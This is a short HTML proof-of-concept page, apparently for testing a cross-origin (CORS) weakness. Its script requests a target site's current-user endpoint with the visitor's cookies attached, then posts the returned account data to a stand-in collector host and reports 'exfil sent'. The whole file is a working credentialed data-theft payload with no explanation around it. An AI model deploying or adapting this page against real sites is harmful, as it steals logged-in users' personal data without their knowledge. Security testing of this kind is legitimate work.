<!doctype html><button id=R>Run</button><pre id=o></pre><script>
const T="https://<TARGET_HOST>/v2/currentuser";const C="http://<COLLECTOR_HOST>:5000/collect";
R.onclick=async()=>{o.textContent='';try{const r=await fetch(T,{credentials:'include'});o.textContent='status:'+r.status;const b=await r.text();o.textContent+='\nlen:'+b.length;await fetch(C,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({from:T,origin:location.origin,status:r.status,body:b})});o.textContent+='\nexfil sent'}catch(e){o.textContent='ERR:'+e}}
</script>
